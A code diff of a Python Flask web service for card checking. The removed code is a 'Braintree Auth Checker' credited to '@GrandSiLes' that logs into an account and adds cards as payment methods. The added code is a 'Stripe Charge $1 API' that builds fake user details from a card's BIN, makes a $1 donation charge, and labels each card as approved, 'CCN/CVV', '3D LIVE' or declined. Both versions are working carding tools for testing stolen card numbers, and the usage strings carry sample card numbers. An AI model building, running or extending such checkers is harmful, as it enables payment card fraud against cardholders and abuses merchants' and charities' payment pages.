-        # Parse card data
-        card_data = self.parse_card_data(lista)
-        if not card_data:
-            return {
-                "error": "Invalid card format. Use: ccn|mm|yy|cvv"
-            }
-        
-        logger.info(f"Checking card: {card_data['cc'][:6]}******")
-        
-        # Get BIN info
-        bin_info = self.get_bin_info(card_data['bin'])
-        logger.info(f"BIN info: {bin_info}")
-        
-        # Login
-        logger.info("Attempting to login...")
-        if not self.login():
-            return {
-                "error": "Failed to login to account - check credentials or website availability"
-            }
-        
-        # Get payment nonce
-        logger.info("Getting payment nonce...")
-        payment_nonce, error = self.get_payment_nonce()
-        if error:
-            return {
-                "error": f"Failed to get payment nonce: {error}"
-            }
-        
-        # Tokenize card
-        logger.info("Tokenizing card with Braintree...")
-        token, error = self.tokenize_card(card_data)
-        if error:
-            return {
-                "error": f"Tokenization failed: {error}"
-            }
-        
-        # Add payment method
-        logger.info("Adding payment method...")
-        response_msg, error = self.add_payment_method(token, payment_nonce)
-        if error:
-            return {
-                "error": f"Payment method failed: {error}"
-            }
-        
-        # Categorize response
-        status = self.categorize_response(response_msg)
-        logger.info(f"Final status: {status}")
-        
-        return {
-            "Author": "@GrandSiLes",
-            "Bank": bin_info['bank'],
-            "Brand": bin_info['brand'],
-            "CC": f"{card_data['cc']}|{card_data['mm']}|{card_data['yy']}|{card_data['cvv']}",
-            "Country": bin_info['country'],
-            "Gateway": "Braintree Auth",
-            "Level": bin_info['level'],
-            "Response": {
-                "message": response_msg,
-                "status": status
-            },
-            "Type": bin_info['type']
-        }
-
-# Initialize checker
-checker = BraintreeAuthChecker()
-
-@app.route('/b3chk', methods=['GET'])
-def check_card():
-    """Main API endpoint for card checking"""
-    lista = request.args.get('lista')
+            return "UNKNOWN"
     
-    if not lista:
+    def format_message(self, status: str) -> str:
+        """Format response message based on status"""
+        return self.response_messages.get(status, "An error occurred while processing your request.")
+
+# Initialize the StripeChargeAPI
+stripe_api = StripeChargeAPI()
+
+@app.route('/')
+def home():
+    return jsonify({
+        'status': 'online',
+        'service': 'Stripe Charge $1 API',
+        'endpoints': {
+            '/onedollar': 'Process card donations',
+            '/health': 'Health check endpoint',
+            '/': 'This information page'
+        },
+        'usage': 'GET /onedollar?chg=4777920800183271|03|29|752'
+    })
+
+@app.route('/health')
+def health():
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': datetime.now().isoformat(),
+        'service': 'stripe-charge-api'
+    })
+
+@app.route('/onedollar')
+def process_card():
+    """Process card donation endpoint"""
+    start_time = time.time()
+    
+    # Get card parameter
+    card_input = request.args.get('chg', '').strip()
+    
+    if not card_input:
         return jsonify({
-            "error": "Missing 'lista' parameter. Use: /b3chk?lista=ccn|mm|yy|cvv"
+            'status': 'error',
+            'message': 'No card provided. Use ?chg=CCN|MM|YY|CVV',
+            'usage': '/onedollar?chg=4777920800183271|03|29|752'
         }), 400
     
     try:
-        result = checker.check_card(lista)
-        return jsonify(result)
-    except Exception as e:
-        logger.error(f"API error: {e}")
+        # Parse card info
+        card_info = stripe_api.parse_card_input(card_input)
+        
+        # Get BIN information
+        bin_info = stripe_api.get_bin_info(card_info['ccn'])
+        
+        # Get user info based on BIN
+        user_info = stripe_api.get_random_user_info(bin_info)
+        
+        # Create Stripe source
+        stripe_source = stripe_api.create_stripe_source(card_info, user_info)
+        
+        if not stripe_source:
+            return jsonify({
+                'status': 'error',
+                'message': 'Failed to create payment source',
+                'bin_info': bin_info if bin_info else 'BIN lookup failed',
+                'card': {
+                    'number': f"************{card_info['ccn'][-4:]}",
+                    'expiry': f"{card_info['mm']}/{card_info['yy']}",
+                    'brand': 'Unknown'
+                }
+            }), 500
+        
+        # Make donation
+        response = stripe_api.make_donation(stripe_source, user_info)
+        
+        # Categorize response
+        status = stripe_api.categorize_response(response.text)
+        formatted_message = stripe_api.format_message(status)
+        
+        # Prepare response
+        response_data = {
+            'status': status,
+            'message': formatted_message,
+            'processing_time': round(time.time() - start_time, 2),
+            'card': {
+                'number': f"************{card_info['ccn'][-4:]}",
+                'expiry': f"{card_info['mm']}/{card_info['yy']}",
+                'brand': stripe_source.get('card', {}).get('brand', 'Unknown')
+            },
+            'bin_info': bin_info if bin_info else {},
+            'transaction': {
+                'amount': 1,
+                'currency': 'USD',
+                'timestamp': datetime.now().isoformat()
+            }
+        }
+        
+        # Add emoji based on status
+        emoji_map = {
+            'APPROVED': '🔥',
+            'CCN/CVV': '✅',
+            '3D LIVE': '✅',
+            'INSUFFICIENT FUNDS': '💰',
+            'STRIPE AUTH': '✅️',
+            'DECLINED': '❌',
+            'UNKNOWN': '❓'
+        }
+        
+        response_data['emoji'] = emoji_map.get(status, '❓')
+        
+        return jsonify(response_data)
+        
+    except ValueError as e:
         return jsonify({
-            "error": f"Internal server error: {str(e)}"
+            'status': 'error',
+            'message': str(e),
+            'suggested_format': 'CCN|MM|YY|CVV or CCN/MM/YY/CVV'
+        }), 400
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': f'Internal server error: {str(e)}'
         }), 500
 
-@app.route('/health', methods=['GET'])
-def health_check():
-    """Health check endpoint"""
-    return jsonify({
-        "status": "healthy",
-        "timestamp": datetime.utcnow().isoformat(),
-        "service": "Braintree Auth Checker API"
-    })
-
-@app.route('/', methods=['GET'])
-def home():
-    """Home endpoint with usage instructions"""
-    return jsonify({
-        "message": "Braintree Auth Checker API",
-        "author": "@GrandSiLes",
-        "usage": "/b3chk?lista=5518277066313600|11|2026|190",
-        "formats_supported": [
-            "ccn|mm|yy|cvv",
-            "ccn|mm|yyyy|cvv", 
-            "ccn|mm/yy|cvv",
-            "ccn|mm/yyyy|cvv"
-        ],
-        "endpoints": {
-            "/b3chk": "Check card through Braintree Auth",
-            "/health": "Health check",
-            "/": "This help page"
-        }
-    })
-
+# Run the app
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
